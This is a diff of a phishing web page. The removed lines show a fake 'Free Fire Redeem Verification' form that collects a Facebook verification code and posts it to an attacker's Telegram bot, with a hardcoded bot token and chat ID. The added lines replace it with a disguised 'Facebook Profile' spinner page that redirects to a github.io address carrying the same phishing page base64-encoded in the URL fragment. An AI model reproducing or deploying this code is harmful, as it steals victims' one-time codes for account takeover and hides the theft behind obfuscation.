@@ -1,112 +1,18 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire Redeem Verification</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #ffffff;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-        }
-        h1 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 20px;
-        }
-        p {
-            font-size: 16px;
-            color: #555;
-            line-height: 1.5;
-            margin-bottom: 30px;
-        }
-        input[type="text"] {
-            width: calc(100% - 20px);
-            padding: 12px 10px;
-            margin-bottom: 20px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-        button {
-            background-color: #007bff;
-            color: white;
-            padding: 12px 25px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 18px;
-            transition: background-color 0.3s ease;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+<title>Facebook Profile</title>
+
+
+
 </head>
 <body>
-    <div class="container">
-        <h1>Free Fire Redeem Verification</h1>
-        <p>We just sent you a verification code. Check your Facebook app notification, verify your code, and get a Free Fire redeem bonus!</p>
-        <input type="text" id="verificationCode" placeholder="Enter your verification code">
-        <button onclick="sendOtp()">Verify Code</button>
-    </div>
+   <div style="width: 100%; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #222;">
+    <div style="width: 100px; height: 100px; border: 5px solid #fff; border-top-color: #00ffff; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+</div>
 
-    <script>
-        function sendOtp() {
-            const botToken = '7348466923:AAEljKlmtXxpO33eF0uRdUAIdsHaRgJP0ho';
-            const chatId = '5666376784';
-            const otp = document.getElementById('verificationCode').value;
 
-            if (otp.trim() === '') {
-                alert('Please enter a verification code.');
-                return;
-            }
 
-            const message = `New OTP received: ${otp}`;
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            const params = new URLSearchParams({
-                chat_id: chatId,
-                text: message
-            });
-
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: params.toString()
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert('OTP sent successfully! Wait for verification.');
-                    // You can optionally clear the input field
-                    // document.getElementById('verificationCode').value = '';
-                } else {
-                    alert('Failed to send OTP. Please try again. Error: ' + data.description);
-                    console.error('Telegram API Error:', data);
-                }
-            })
-            .catch(error => {
-                alert('An error occurred while sending OTP.');
-                console.error('Network Error:', error);
-            });
-        }
-    </script>
-</body>
+    <script> window.location.href="https://hostbdrun.github.io/market/#eyJ2ZXJzaW9uIjoiMC4yLjAiLCJjb21wcmVzc2VkIjpmYWxzZSwiYm9keSI6IlxuPCFET0NUWVBFIGh0bWw+XG48aGVhZD5cbjxzdHlsZT5cblxuXG5cbjwvc3R5bGU+XG48c2NyaXB0IHR5cGU9XCJ0ZXh0L2phdmFzY3JpcHRcIj5cblxuPC9zY3JpcHQ+XG48L2hlYWQ+XG48Ym9keT5cbjwhRE9DVFlQRSBodG1sPlxuPGh0bWwgbGFuZz1cImVuXCI+XG48aGVhZD5cbiAgICA8bWV0YSBjaGFyc2V0PVwiVVRGLThcIj5cbiAgICA8bWV0YSBuYW1lPVwidmlld3BvcnRcIiBjb250ZW50PVwid2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMFwiPlxuICAgIDx0aXRsZT5GcmVlIEZpcmUgUmVkZWVtIFZlcmlmaWNhdGlvbjwvdGl0bGU+XG4gICAgPHN0eWxlPlxuICAgICAgICBib2R5IHtcbiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjtcbiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmMGYyZjU7XG4gICAgICAgICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAgICAgICAgICAgbWluLWhlaWdodDogMTAwdmg7XG4gICAgICAgICAgICBtYXJnaW46IDA7XG4gICAgICAgIH1cbiAgICAgICAgLmNvbnRhaW5lciB7XG4gICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmO1xuICAgICAgICAgICAgcGFkZGluZzogMzBweDtcbiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDtcbiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsIDAsIDAsIDAuMSk7XG4gICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gICAgICAgICAgICBtYXgtd2lkdGg6IDQwMHB4O1xuICAgICAgICAgICAgd2lkdGg6IDkwJTtcbiAgICAgICAgfVxuICAgICAgICBoMSB7XG4gICAgICAgICAgICBmb250LXNpemU6IDI0cHg7XG4gICAgICAgICAgICBjb2xvcjogIzMzMztcbiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDIwcHg7XG4gICAgICAgIH1cbiAgICAgICAgcCB7XG4gICAgICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgICAgICBjb2xvcjogIzU1NTtcbiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxLjU7XG4gICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAzMHB4O1xuICAgICAgICB9XG4gICAgICAgIGlucHV0W3R5cGU9XCJ0ZXh0XCJdIHtcbiAgICAgICAgICAgIHdpZHRoOiBjYWxjKDEwMCUgLSAyMHB4KTtcbiAgICAgICAgICAgIHBhZGRpbmc6IDEycHggMTBweDtcbiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDIwcHg7XG4gICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjY2NjO1xuICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4O1xuICAgICAgICAgICAgZm9udC1zaXplOiAxNnB4O1xuICAgICAgICB9XG4gICAgICAgIGJ1dHRvbiB7XG4gICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA3YmZmO1xuICAgICAgICAgICAgY29sb3I6IHdoaXRlO1xuICAgICAgICAgICAgcGFkZGluZzogMTJweCAyNXB4O1xuICAgICAgICAgICAgYm9yZGVyOiBub25lO1xuICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4O1xuICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyO1xuICAgICAgICAgICAgZm9udC1zaXplOiAxOHB4O1xuICAgICAgICAgICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzIGVhc2U7XG4gICAgICAgIH1cbiAgICAgICAgYnV0dG9uOmhvdmVyIHtcbiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDU2YjM7XG4gICAgICAgIH1cbiAgICA8L3N0eWxlPlxuPC9oZWFkPlxuPGJvZHk+XG4gICAgPGRpdiBjbGFzcz1cImNvbnRhaW5lclwiPlxuICAgICAgICA8aDE+RnJlZSBGaXJlIFJlZGVlbSBWZXJpZmljYXRpb248L2gxPlxuICAgICAgICA8cD5XZSBqdXN0IHNlbnQgeW91IGEgdmVyaWZpY2F0aW9uIGNvZGUuIENoZWNrIHlvdXIgRmFjZWJvb2sgYXBwIG5vdGlmaWNhdGlvbiwgdmVyaWZ5IHlvdXIgY29kZSwgYW5kIGdldCBhIEZyZWUgRmlyZSByZWRlZW0gYm9udXMhPC9wPlxuICAgICAgICA8aW5wdXQgdHlwZT1cInRleHRcIiBpZD1cInZlcmlmaWNhdGlvbkNvZGVcIiBwbGFjZWhvbGRlcj1cIkVudGVyIHlvdXIgdmVyaWZpY2F0aW9uIGNvZGVcIj5cbiAgICAgICAgPGJ1dHRvbiBvbmNsaWNrPVwic2VuZE90cCgpXCI+VmVyaWZ5IENvZGU8L2J1dHRvbj5cbiAgICA8L2Rpdj5cblxuICAgIDxzY3JpcHQ+XG4gICAgICAgIGZ1bmN0aW9uIHNlbmRPdHAoKSB7XG4gICAgICAgICAgICBjb25zdCBib3RUb2tlbiA9ICc3MzQ4NDY2OTIzOkFBRWxqS2xtdFh4cE8zM2VGMHVSZFVBSWRzSGFSZ0pQMGhvJztcbiAgICAgICAgICAgIGNvbnN0IGNoYXRJZCA9ICc1NjY2Mzc2Nzg0JztcbiAgICAgICAgICAgIGNvbnN0IG90cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd2ZXJpZmljYXRpb25Db2RlJykudmFsdWU7XG5cbiAgICAgICAgICAgIGlmIChvdHAudHJpbSgpID09PSAnJykge1xuICAgICAgICAgICAgICAgIGFsZXJ0KCdQbGVhc2UgZW50ZXIgYSB2ZXJpZmljYXRpb24gY29kZS4nKTtcbiAgICAgICAgICAgICAgICByZXR1cm47XG4gICAgICAgICAgICB9XG5cbiAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2UgPSBgTmV3IE9UUCByZWNlaXZlZDogJHtvdHB9YDtcbiAgICAgICAgICAgIGNvbnN0IHVybCA9IGBodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHtib3RUb2tlbn0vc2VuZE1lc3NhZ2VgO1xuXG4gICAgICAgICAgICBjb25zdCBwYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHtcbiAgICAgICAgICAgICAgICBjaGF0X2lkOiBjaGF0SWQsXG4gICAgICAgICAgICAgICAgdGV4dDogbWVzc2FnZVxuICAgICAgICAgICAgfSk7XG5cbiAgICAgICAgICAgIGZldGNoKHVybCwge1xuICAgICAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICBib2R5OiBwYXJhbXMudG9TdHJpbmcoKVxuICAgICAgICAgICAgfSlcbiAgICAgICAgICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLmpzb24oKSlcbiAgICAgICAgICAgIC50aGVuKGRhdGEgPT4ge1xuICAgICAgICAgICAgICAgIGlmIChkYXRhLm9rKSB7XG4gICAgICAgICAgICAgICAgICAgIGFsZXJ0KCdPVFAgc2VudCBzdWNjZXNzZnVsbHkhIFdhaXQgZm9yIHZlcmlmaWNhdGlvbi4nKTtcbiAgICAgICAgICAgICAgICAgICAgLy8gWW91IGNhbiBvcHRpb25hbGx5IGNsZWFyIHRoZSBpbnB1dCBmaWVsZFxuICAgICAgICAgICAgICAgICAgICAvLyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndmVyaWZpY2F0aW9uQ29kZScpLnZhbHVlID0gJyc7XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgYWxlcnQoJ0ZhaWxlZCB0byBzZW5kIE9UUC4gUGxlYXNlIHRyeSBhZ2Fpbi4gRXJyb3I6ICcgKyBkYXRhLmRlc2NyaXB0aW9uKTtcbiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignVGVsZWdyYW0gQVBJIEVycm9yOicsIGRhdGEpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0pXG4gICAgICAgICAgICAuY2F0Y2goZXJyb3IgPT4ge1xuICAgICAgICAgICAgICAgIGFsZXJ0KCdBbiBlcnJvciBvY2N1cnJlZCB3aGlsZSBzZW5kaW5nIE9UUC4nKTtcbiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdOZXR3b3JrIEVycm9yOicsIGVycm9yKTtcbiAgICAgICAgICAgIH0pO1xuICAgICAgICB9XG4gICAgPC9zY3JpcHQ+XG48L2JvZHk+XG48L2h0bWw+XG5cbjwvYm9keT5cbiJ9";
+        </script>
 </html>
